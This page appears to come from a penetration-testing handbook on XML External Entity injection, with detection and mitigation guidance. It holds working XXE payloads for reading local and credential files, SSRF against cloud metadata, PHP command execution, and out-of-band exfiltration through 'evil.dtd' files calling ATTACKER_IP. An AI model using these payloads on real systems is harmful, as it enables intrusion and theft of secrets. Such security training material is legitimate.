% Filename: 04-web-testing/injection/xxe.md
% Display name: XML External Entity (XXE) Injection
% Last update: 2026-02-11
% ATT&CK Tactics: TA0001 (Initial Access), TA0009 (Collection)
% ATT&CK Techniques: T1190 (Exploit Public-Facing Application), T1005 (Data from Local System)
% Authors: @TristanInSec

# XML External Entity (XXE) Injection

## Overview

XXE injection exploits XML parsers that process external entity definitions. When an application parses user-supplied XML without disabling external entities, the attacker can read local files, perform server-side request forgery (SSRF), exfiltrate data out-of-band, or in some cases achieve remote code execution.

XXE affects any application that parses XML input — SOAP APIs, XML-RPC, file uploads (DOCX, XLSX, SVG), RSS/Atom feeds, SAML authentication, and custom XML APIs.

## ATT&CK Mapping

- **Tactic:** TA0009 - Collection
- **Technique:** T1005 - Data from Local System
- **Tactic:** TA0001 - Initial Access
- **Technique:** T1190 - Exploit Public-Facing Application

## Prerequisites

- Application accepts and parses XML input
- XML parser has external entity processing enabled (the default in many libraries)
- No input validation stripping DTD declarations

## Detection Methodology

### Identifying XML Endpoints

XXE can exist anywhere XML is parsed, not just obvious XML APIs:

- SOAP web services
- REST APIs accepting `Content-Type: application/xml` or `text/xml`
- File upload endpoints (DOCX, XLSX, SVG, XML config files)
- SAML SSO endpoints
- RSS/Atom feed importers
- Applications using `Content-Type: application/xml` (try changing `application/json` to `application/xml` — some frameworks auto-parse)

### Confirming XXE

Submit a basic entity definition and check if it resolves:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe "XXE_TEST_STRING">
]>
<root>&xxe;</root>
```

If `XXE_TEST_STRING` appears in the response, the parser processes entities.

## Techniques

### Classic XXE — File Read

Read local files by defining an external entity pointing to a `file://` URI:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

The file contents replace `&xxe;` in the response.

**Common targets:**

```text
file:///etc/passwd
file:///etc/shadow           (requires root)
file:///etc/hostname
file:///proc/self/environ    (environment variables — may contain secrets)
file:///proc/self/cmdline    (running process command line)
file:///home/user/.ssh/id_rsa
file:///var/www/html/config.php
file:///var/www/html/.env
```

**Windows targets:**

```text
file:///c:/windows/system32/drivers/etc/hosts
file:///c:/inetpub/wwwroot/web.config
file:///c:/windows/win.ini
```

### XXE to SSRF

Use external entities to make the server request internal resources:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

This queries the AWS metadata service from the server's network. Also useful for scanning internal hosts:

```xml
<!ENTITY xxe SYSTEM "http://192.168.1.1:8080/">
<!ENTITY xxe SYSTEM "http://internal-app.corp.local/admin">
```

### Blind XXE — Out-of-Band (OOB) Data Exfiltration

When the entity value is not reflected in the response, use out-of-band channels to exfiltrate data.

**Step 1 — Host a malicious DTD on the attacker server:**

Create `evil.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_IP:8000/?data=%file;'>">
%eval;
%exfil;
```

**Step 2 — Submit payload referencing the external DTD:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP:8000/evil.dtd">
  %xxe;
]>
<root>test</root>
```

**Step 3 — Catch the exfiltrated data:**

```bash
# Start a listener
python3 -m http.server 8000
```

The server makes a request to `http://ATTACKER_IP:8000/?data=<file_contents>`, visible in the HTTP server logs.

**Limitation:** OOB exfiltration via HTTP URIs fails for files containing XML-special characters (`<`, `&`) or newlines. Use the FTP protocol for multi-line file exfiltration.

### Blind XXE via FTP

FTP handles multi-line data better than HTTP for exfiltration:

**evil.dtd:**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://ATTACKER_IP:2121/%file;'>">
%eval;
%exfil;
```

Use a simple FTP listener (e.g., Python `pyftpdlib` or a custom script) to capture the data.

### Error-Based XXE

Force the parser to include file contents in error messages:

**evil.dtd:**

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

The parser error message reveals the file contents: `file:///nonexistent/webserver01` (where `webserver01` is the hostname).

### XXE via File Uploads

Office documents (DOCX, XLSX, PPTX) and SVG files are XML-based. If the application parses their XML content, XXE is possible.

**SVG:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="0" y="20">&xxe;</text>
</svg>
```

**DOCX/XLSX:**

1. Create a valid DOCX/XLSX file
2. Unzip it (Office formats are ZIP archives containing XML)
3. Inject XXE payload into one of the XML files (e.g., `[Content_Types].xml`, `word/document.xml`)
4. Rezip and upload

```bash
# Unzip DOCX
mkdir docx_extracted && cd docx_extracted
unzip ../document.docx

# Edit XML files to inject XXE payload
# Then rezip
zip -r ../malicious.docx .
```

### XInclude

When you don't control the entire XML document (e.g., your input is inserted into a specific field), you cannot define a DTD. Use XInclude instead:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

XInclude works when the parser supports it and your input lands inside an XML element.

### PHP-Specific — XXE with Expect

If the PHP `expect` module is loaded, XXE can achieve direct command execution:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>
```

The `expect://` wrapper executes commands and returns output. This requires the `php-expect` extension, which is rare in production.

### CDATA Exfiltration

Files containing XML-special characters (`<`, `&`) break standard XXE file read. The CDATA wrapper technique constructs a general entity containing the file contents wrapped in a CDATA section, using an external DTD.

**evil.dtd:**

```xml
<!ENTITY % file SYSTEM "file:///etc/fstab">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContent '%start;%file;%end;'>">
%all;
```

**Payload:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP:8000/evil.dtd">
  %xxe;
]>
<root>&fileContent;</root>
```

`%all;` defines a **general entity** `&fileContent;` (not a parameter entity). The general entity `&fileContent;` is then referenceable in the document body. Note: CDATA sections cannot themselves contain `]]>` — files containing that sequence will truncate the output.

## Detection Methods

### Network-Based Detection

- XML payloads containing `<!DOCTYPE` and `<!ENTITY` declarations in HTTP requests
- Outbound requests from the web server to unexpected IPs (SSRF/OOB indicators)
- HTTP requests containing `SYSTEM` keyword with `file://`, `http://`, `ftp://`, or `expect://` URIs
- DNS queries from the web server for attacker-controlled domains

### Host-Based Detection

- XML parser accessing local files outside the application directory
- Application process making HTTP/FTP connections not part of normal workflow
- Error logs containing XML parsing errors with file path references
- Monitoring for access to sensitive files (`/etc/passwd`, `/etc/shadow`, `/proc/self/environ`)

## Mitigation Strategies

- **Disable external entity processing** — the most effective mitigation. Every XML library has a configuration option:
  - PHP: `libxml_disable_entity_loader(true)` (deprecated in PHP 8.0+, external entities disabled by default)
  - Java: `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`
  - Python (lxml): `etree.XMLParser(resolve_entities=False)`
  - .NET: `XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit`
- **Disable DTD processing entirely** — prevents all DTD-based attacks including billion laughs DoS
- **Use less complex data formats** — prefer JSON over XML when possible
- **Input validation** — strip or reject `<!DOCTYPE` and `<!ENTITY` declarations before parsing
- **Patch XML libraries** — ensure parsers are up to date with security patches

## References

### Pentest Guides & Research

- [PortSwigger Web Security Academy - XXE Injection](https://portswigger.net/web-security/xxe)
- [OWASP - XML External Entity (XXE) Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [OWASP - XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

### MITRE ATT&CK

- [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [T1005 - Data from Local System](https://attack.mitre.org/techniques/T1005/)
